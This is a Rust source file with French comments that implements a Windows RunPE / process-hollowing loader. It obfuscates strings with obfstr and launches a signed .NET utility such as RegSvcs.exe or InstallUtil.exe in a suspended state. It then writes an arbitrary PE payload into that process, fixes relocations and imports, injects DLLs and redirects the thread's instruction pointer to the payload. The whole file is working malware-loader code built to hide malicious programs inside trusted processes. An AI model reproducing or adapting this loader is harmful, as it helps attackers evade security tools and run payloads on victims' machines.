#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::env;
use std::fs::File;
use std::io::Read;
use std::process::exit;
use std::ptr;
use obfstr::obfstr;

// =============================================================
// WINDOWS: RUNPE / PROCESS HOLLOWING
// =============================================================
#[cfg(target_os = "windows")]
pub unsafe fn run_pe(payload: Vec<u8>) {
    use winapi::um::processthreadsapi::{CreateProcessA, GetThreadContext, SetThreadContext, ResumeThread, TerminateProcess};
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, ReadProcessMemory};
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, CONTEXT_FULL, 
        IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
        IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
        IMAGE_BASE_RELOCATION, IMAGE_IMPORT_DESCRIPTOR, IMAGE_THUNK_DATA64, 
        IMAGE_REL_BASED_DIR64
    };
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    use std::ffi::CString;

    // --- CORRECTION CRITIQUE ICI ---
    // On utilise .to_string() pour copier la chaîne temporaire d'obfstr dans une String persistante (Heap).
    // Cela empêche l'erreur "temporary value dropped while borrowed".
    let s1 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe").to_string();
    let s2 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe").to_string();
    let s3 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe").to_string();
    let s4 = obfstr!("C:\\Windows\\System32\\cmd.exe").to_string();

    // Maintenant on peut faire un tableau de références vers ces Strings valides
    let candidates = [&s1, &s2, &s3, &s4];

    let mut si = std::mem::zeroed();
    let mut pi = std::mem::zeroed();
    let mut success = 0;
    let mut chosen_host = "";

    for host in candidates.iter() {
        if std::path::Path::new(host).exists() {
            // Conversion String -> CString pour l'API Windows
            let app_name = CString::new(host.as_str()).unwrap();
            
            success = CreateProcessA(
                app_name.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi
            );
            if success != 0 {
                chosen_host = host;
                break; 
            }
        }
    }

    if success == 0 {
        // println!("{}", obfstr!("[-] Erreur hôte."));
        return;
    }
    // println!("{} {}", obfstr!("[*] Hote:"), chosen_host);

    // Parsing PE
    let dos_header = &*(payload.as_ptr() as *const IMAGE_DOS_HEADER);
    let nt_headers = &*(payload.as_ptr().offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64);
    
    if dos_header.e_magic != 0x5A4D || nt_headers.Signature != 0x4550 {
        TerminateProcess(pi.hProcess, 1);
        return; 
    }

    let img_base = nt_headers.OptionalHeader.ImageBase;
    let img_size = nt_headers.OptionalHeader.SizeOfImage as usize;

    // Allocation
    let mut dest_addr = VirtualAllocEx(pi.hProcess, img_base as *mut _, img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    let mut delta_reloc: isize = 0;

    if dest_addr.is_null() {
        dest_addr = VirtualAllocEx(pi.hProcess, ptr::null_mut(), img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if dest_addr.is_null() { TerminateProcess(pi.hProcess, 1); return; }
        delta_reloc = (dest_addr as isize).wrapping_sub(img_base as isize);
    }

    // Copie Headers
    let mut bytes_written = 0;
    WriteProcessMemory(pi.hProcess, dest_addr, payload.as_ptr() as *const _, nt_headers.OptionalHeader.SizeOfHeaders as usize, &mut bytes_written);

    // Copie Sections
    let section_header_ptr = (payload.as_ptr().offset(dos_header.e_lfanew as isize) as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section = &*section_header_ptr.offset(i as isize);
        if section.SizeOfRawData > 0 {
            let dest = (dest_addr as usize + section.VirtualAddress as usize) as *mut _;
            let src = payload.as_ptr().offset(section.PointerToRawData as isize) as *const _;
            WriteProcessMemory(pi.hProcess, dest, src, section.SizeOfRawData as usize, &mut bytes_written);
        }
    }

    // Relocations
    if delta_reloc != 0 {
        let reloc_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.Size > 0 {
            let mut reloc_offset = resolve_rva(nt_headers, section_header_ptr, reloc_dir.VirtualAddress);
            let mut reloc_block = (payload.as_ptr() as usize + reloc_offset) as *const IMAGE_BASE_RELOCATION;
            while (*reloc_block).SizeOfBlock > 0 {
                let count = ((*reloc_block).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let reloc_data = (reloc_block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
                for i in 0..count {
                    let entry = *reloc_data.offset(i as isize);
                    if (entry >> 12) == IMAGE_REL_BASED_DIR64 { 
                        let target_rva = (*reloc_block).VirtualAddress as usize + (entry & 0x0FFF) as usize;
                        let patch_addr = (dest_addr as usize + target_rva) as *mut u64;
                        let mut val: u64 = 0;
                        ReadProcessMemory(pi.hProcess, patch_addr as *const _, &mut val as *mut _ as *mut _, 8, ptr::null_mut());
                        let patched = (val as isize + delta_reloc) as u64;
                        WriteProcessMemory(pi.hProcess, patch_addr as *mut _, &patched as *const _ as *const _, 8, ptr::null_mut());
                    }
                }
                reloc_offset += (*reloc_block).SizeOfBlock as usize;
                reloc_block = (payload.as_ptr() as usize + reloc_offset) as *const IMAGE_BASE_RELOCATION;
            }
        }
    }

    // Imports & Injection
    let import_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.Size > 0 {
        let mut import_desc_offset = resolve_rva(nt_headers, section_header_ptr, import_dir.VirtualAddress);
        let mut import_desc = (payload.as_ptr() as usize + import_desc_offset) as *const IMAGE_IMPORT_DESCRIPTOR;

        while (*import_desc).Name != 0 {
            let dll_name_offset = resolve_rva(nt_headers, section_header_ptr, (*import_desc).Name);
            let dll_name_ptr = (payload.as_ptr() as usize + dll_name_offset) as *const i8;
            let c_dll_name = std::ffi::CStr::from_ptr(dll_name_ptr);
            let dll_str = c_dll_name.to_string_lossy();

            // Injection des DLL (fix crash)
            if !dll_str.to_lowercase().contains(obfstr!("kernel32.dll")) && !dll_str.to_lowercase().contains(obfstr!("ntdll.dll")) {
                inject_remote_dll(pi.hProcess, &dll_str);
            }

            let h_dll = LoadLibraryA(dll_name_ptr);
            if !h_dll.is_null() {
                let mut thunk_rva = (*import_desc).FirstThunk;
                let mut original_thunk_rva = *(*import_desc).u.OriginalFirstThunk();
                if original_thunk_rva == 0 { original_thunk_rva = thunk_rva; }

                let mut thunk_ptr = (payload.as_ptr() as usize + resolve_rva(nt_headers, section_header_ptr, original_thunk_rva)) as *const IMAGE_THUNK_DATA64;
                let mut dest_thunk_addr = (dest_addr as usize + thunk_rva as usize) as *mut u64;

                while *(*thunk_ptr).u1.AddressOfData() != 0 {
                    let func_addr;
                    if (*(*thunk_ptr).u1.Ordinal() & 0x8000000000000000) != 0 {
                        let ordinal = (*(*thunk_ptr).u1.Ordinal() & 0xFFFF) as u64;
                        func_addr = GetProcAddress(h_dll, ordinal as *const i8);
                    } else {
                        let name_offset = resolve_rva(nt_headers, section_header_ptr, *(*thunk_ptr).u1.AddressOfData() as u32);
                        let name_ptr = (payload.as_ptr() as usize + name_offset + 2) as *const i8; 
                        func_addr = GetProcAddress(h_dll, name_ptr);
                    }
                    if !func_addr.is_null() {
                        WriteProcessMemory(pi.hProcess, dest_thunk_addr as *mut _, &func_addr as *const _ as *const _, 8, ptr::null_mut());
                    }
                    thunk_ptr = thunk_ptr.offset(1);
                    dest_thunk_addr = dest_thunk_addr.offset(1);
                }
            }
            import_desc = import_desc.offset(1);
        }
    }

    // Hijack
    let mut ctx = std::mem::zeroed::<winapi::um::winnt::CONTEXT>();
    ctx.ContextFlags = CONTEXT_FULL;
    
    if GetThreadContext(pi.hThread, &mut ctx) != 0 {
        let entry_point = (dest_addr as u64) + nt_headers.OptionalHeader.AddressOfEntryPoint as u64;
        ctx.Rip = entry_point;
        ctx.Rcx = dest_addr as u64; 
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        //println!("{}", obfstr!("[+] Injection REUSSIE !"));
    }
}